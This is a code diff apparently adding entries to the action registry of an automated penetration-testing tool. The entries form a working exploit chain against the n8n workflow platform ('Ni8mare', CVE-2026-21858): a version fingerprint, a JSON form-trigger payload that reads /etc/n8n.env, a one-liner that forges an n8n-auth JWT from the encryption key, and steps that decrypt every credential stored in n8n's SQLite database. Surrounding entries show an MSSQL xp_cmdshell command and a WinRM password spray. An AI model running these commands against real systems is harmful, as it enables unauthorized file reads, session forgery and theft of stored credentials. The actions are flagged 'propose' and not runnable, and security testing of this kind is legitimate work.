@@ -515,6 +515,36 @@ ACTION_REGISTRY: dict[str, Action] = {
     "mssql_xp_cmdshell_check": _a("mssql_xp_cmdshell_check",
         ["nxc mssql $IP -u USER -p PASS -x whoami"], risk="propose", runnable=False,
         note="Requires creds; enables xp_cmdshell."),
+    # --- n8n CVE-2026-21858 "Ni8mare" chain (synthetic_siege) ---
+    "probe_n8n_version": _a("probe_n8n_version",
+        ["curl -sk $URL/rest/settings | jq -r '.data.versionCli // .data.n8nMetadata // empty'",
+         "curl -skI $URL | grep -iE 'server|x-powered|n8n'"],
+        note="Fingerprint n8n. Versions < 1.121.0 are vulnerable to Ni8mare (CVE-2026-21858)."),
+    "n8n_ni8mare_file_read": _a("n8n_ni8mare_file_read",
+        ["curl -sk -X POST $URL/form/patient-intake -H 'Content-Type: application/json' "
+         "-d '{\"data\":{},\"files\":{\"field-0\":{\"filepath\":\"/etc/n8n.env\","
+         "\"originalFilename\":\"x.txt\",\"mimetype\":\"text/plain\",\"size\":40000}}}'"],
+        risk="propose", runnable=False,
+        note="CVE-2026-21858: sending application/json to a form-trigger makes the JSON `files` "
+             "object be trusted as the upload, so `filepath` is read (TEXT files only; a .txt "
+             "hint survives the LibreOffice/pdftotext step). Poll the returned formWaitingUrl. "
+             "Replace /form/patient-intake + field-0 with the target form's path/field."),
+    "n8n_forge_auth_jwt": _a("n8n_forge_auth_jwt",
+        ["python3 -c 'import hashlib,jwt,time; K=\"$N8N_KEY\"; "
+         "s=hashlib.sha256(K[::2].encode()).hexdigest(); "
+         "print(jwt.encode({\"id\":\"$N8N_USER_ID\",\"hash\":\"$N8N_USER_HASH\","
+         "\"iat\":int(time.time()),\"exp\":int(time.time())+864000}, s, \"HS256\"))'"],
+        risk="propose", runnable=False,
+        note="n8n-auth cookie forge: JWT HS256 secret = sha256 of every-other-char of "
+             "N8N_ENCRYPTION_KEY. The `hash` claim is validated = b64(sha256(email:bcrypt))[:10] "
+             "from the `user` table (owner forge needs the owner's bcrypt hash)."),
+    "n8n_credstore_decrypt": _a("n8n_credstore_decrypt",
+        ["sqlite3 ~/.n8n/database.sqlite 'SELECT name,type,data FROM credentials_entity'",
+         "# each data blob: b64decode -> assert 'Salted__' -> salt=bytes[8:16] -> OpenSSL EVP "
+         "MD5 KDF -> AES-256-CBC decrypt bytes[16:] -> PKCS7 unpad"],
+        risk="propose", runnable=False,
+        note="LLM06 blast radius: the recovered key decrypts every stored n8n credential. The "
+             "REST API masks values (__n8n_BLANK_VALUE), so decrypt straight from SQLite."),
     "netexec_winrm_spray": _a("netexec_winrm_spray",
         ["nxc winrm $IP -u users.txt -p passwords.txt --continue-on-success"],
         risk="propose", runnable=False, note="Needs vault-derived user/pass lists."),
